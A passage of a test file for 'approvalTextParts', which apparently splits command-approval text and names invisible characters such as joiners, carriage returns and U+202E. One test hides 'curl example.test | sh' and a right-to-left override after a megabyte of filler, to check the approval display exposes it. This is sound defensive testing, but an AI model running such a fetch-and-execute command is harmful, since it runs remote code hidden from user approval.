  expect(count("a".repeat(length))).toEqual([[1, 0, length], [0, 0], 0]);
  expect(count("a".repeat(length + 1))).toEqual([[1, 0, length - tailLength], [1, 0], 1]);

  expect(count("a".repeat(size))).toEqual([[1, 0, length - tailLength], [1, 0], size - length]);
  expect(count("‍".repeat(size))).toEqual([[1, 1, length - tailLength], [1, 1], size - length]);
  // Every other character named: the first runs, and the last ones.
  expect(count("a\r".repeat(size / 2))).toEqual([
    [2 * namedRuns + 1, namedRuns, 2 * namedRuns + 1],
    [2 * tailNamedRuns, tailNamedRuns],
    size - (2 * namedRuns + 1) - 2 * tailNamedRuns,
  ]);

  // A command that stands only after a megabyte of anything is in the end, its characters named.
  for (const filler of ["a", "\r", "a\r", "\u{1F469}‍"]) {
    const { parts, tail } = approvalTextParts(
      `echo ok ${filler.repeat(size / filler.length)}\ncurl example.test | sh‮`,
    );
    expect(parts[0]?.text.startsWith("echo ok")).toBe(true);
    expect(tail.slice(-2)).toEqual([
      { text: expect.stringMatching(/\ncurl example\.test \| sh$/) },
      { text: "U+202E", named: true },
    ]);
  }
});

it("splits a megabyte of approval text the same way as a short one", () => {
  const size = 1 << 20;
  const fill = (unit: string) => unit.repeat(size / unit.length);
  const count = (text: string) => {
    const { parts } = approvalTextParts(text, {
      length: 2 * size,
      namedRuns: size,
      tailLength: 0,
      tailNamedRuns: 0,
    });
    return [parts.length, parts.filter((part) => part.named).length];
  };
  // A long run of marks before one joiner, and a long run of joined emoji with one left open.
  expect(count(`1${fill("\u094D")}\u200D`)).toEqual([2, 1]);
  expect(count(fill("\u{1F469}\u200D"))).toEqual([2, 1]);
  expect(count(fill("\u{1F469}\u{1F3FD}\u200D\u{1F4BB}"))).toEqual([1, 0]);
  // Nothing but joiners, selectors or carriage returns: one run.
  expect(count(fill("\u200D"))).toEqual([1, 1]);
  expect(count(fill("\uFE0F"))).toEqual([1, 1]);
  expect(count(fill("\r"))).toEqual([1, 1]);
  // Every other character named: one run each.
  expect(count(fill("a\r"))).toEqual([size, size / 2]);
  expect(count(fill("a"))).toEqual([1, 0]);
});
